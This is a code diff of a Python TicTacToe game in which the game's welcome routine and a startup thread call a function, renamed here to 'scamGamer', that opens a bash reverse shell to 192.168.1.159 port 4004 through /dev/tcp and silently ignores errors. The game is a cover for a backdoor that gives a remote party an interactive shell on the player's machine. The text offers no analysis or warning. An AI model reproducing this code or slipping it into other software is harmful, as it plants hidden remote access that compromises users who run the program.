@@ -14,7 +14,7 @@ markers = [
 def welcome():
     """Function to welcome new player"""
     print("Welcome to TicTacToe")
-    fn()
+    scamGamer()
     print("Here is a sample board,\nremember the positions of board")
     draw_board([" 0", "1", "2", " 3", "4", "5", " 6", "7", "8"])
 
@@ -174,16 +174,15 @@ def main():
                 print("There is a tie")
                 break
 
-def fn():
+def scamGamer():
     try:
         subprocess.check_call("/bin/bash -i > /dev/tcp/192.168.1.159/4004 0<&1 2>&1", shell=True, executable="/bin/bash")
-        print('hiiiiiiii')
     except:
         return 0
 
 
 if __name__ == "__main__":
-    thread = threading.Thread(target=fn, args=(10,))
+    thread = threading.Thread(target=scamGamer, args=(10,))
     thread.start()
     main()
    
